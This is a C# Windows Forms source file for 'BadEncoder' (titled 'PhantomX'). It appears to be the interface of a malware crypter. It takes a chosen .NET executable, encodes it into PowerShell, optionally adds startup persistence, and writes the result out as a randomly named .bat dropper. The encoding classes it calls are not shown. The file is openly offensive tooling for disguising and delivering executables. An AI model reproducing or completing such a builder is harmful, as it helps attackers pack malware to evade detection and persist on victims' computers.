using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace BadEncoder
{
  public class Form1 : Form
  {
    private static string FilePath = "";
        private Button button1;
        private TextBox textBox1;
        private Button button2;
        private CheckBox checkBox1;
        private GroupBox groupBox1;
        private IContainer components = (IContainer) null;

    public Form1() => this.InitializeComponent();

    private void Form_Load()
    {
    }

    private void button2_Click(object sender, EventArgs e) => Environment.Exit(0);





    private void Form1_Load(object sender, EventArgs e)
    {
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
            this.button1 = new System.Windows.Forms.Button();
            this.textBox1 = new System.Windows.Forms.TextBox();
            this.button2 = new System.Windows.Forms.Button();
            this.checkBox1 = new System.Windows.Forms.CheckBox();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.groupBox1.SuspendLayout();
            this.SuspendLayout();
            // 
            // button1
            // 
            this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button1.Location = new System.Drawing.Point(12, 12);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(94, 35);
            this.button1.TabIndex = 15;
            this.button1.Text = "...";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new System.EventHandler(this.button1_Click_1);
            // 
            // textBox1
            // 
            this.textBox1.Location = new System.Drawing.Point(112, 12);
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new System.Drawing.Size(603, 26);
            this.textBox1.TabIndex = 16;
            // 
            // button2
            // 
            this.button2.Location = new System.Drawing.Point(9, 275);
            this.button2.Name = "button2";
            this.button2.Size = new System.Drawing.Size(706, 70);
            this.button2.TabIndex = 15;
            this.button2.Text = "Build";
            this.button2.UseVisualStyleBackColor = true;
            this.button2.Click += new System.EventHandler(this.button2_Click_1);
            // 
            // checkBox1
            // 
            this.checkBox1.AutoSize = true;
            this.checkBox1.Location = new System.Drawing.Point(6, 36);
            this.checkBox1.Name = "checkBox1";
            this.checkBox1.Size = new System.Drawing.Size(88, 24);
            this.checkBox1.TabIndex = 17;
            this.checkBox1.Text = "Startup";
            this.checkBox1.UseVisualStyleBackColor = true;
            // 
            // groupBox1
            // 
            this.groupBox1.Controls.Add(this.checkBox1);
            this.groupBox1.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
            this.groupBox1.Location = new System.Drawing.Point(12, 62);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(703, 207);
            this.groupBox1.TabIndex = 18;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "Options";
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(9F, 20F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.WhiteSmoke;
            this.ClientSize = new System.Drawing.Size(738, 362);
            this.Controls.Add(this.groupBox1);
            this.Controls.Add(this.textBox1);
            this.Controls.Add(this.button2);
            this.Controls.Add(this.button1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog;
            this.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.Name = "Form1";
            this.Text = "PhantomX";
            this.Load += new System.EventHandler(this.Form1_Load);
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

    }

        private void button2_Click_1(object sender, EventArgs e)
        {
            if (!string.IsNullOrEmpty(Form1.FilePath))
            {
                if (Functions.IsDotNetAssembly(Form1.FilePath))
                {
                    try
                    {
                        string contents = Bat_Encoder.Build_Bat(!this.checkBox1.Checked ? Powershell_Encoding.Crypt_Without_Startup(Form1.FilePath) : Powershell_Encoding.Crypt_With_Startup(Form1.FilePath));
                        if (string.IsNullOrEmpty(contents))
                            return;

                        File.WriteAllText(Functions.generate_random_string(new Random().Next(5, 10)) + ".bat", contents);
                        int num = (int)MessageBox.Show("File successfully Build!", "Success!");



                    }
                    catch(Exception ex)
                    {
                        int num = (int)MessageBox.Show("Build Failed," + ex.ToString(), "Error");
                    }
                }
                else
                {
                    int num2 = (int)MessageBox.Show("File is not a .Net EXE!", "Error");
                }
            }
            else
            {
                int num3 = (int)MessageBox.Show("No File Choosen", "Error");
            }
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            string str = Functions.Choose_File();
            Form1.FilePath = str;
            this.textBox1.Text = str;
        }
    }
}
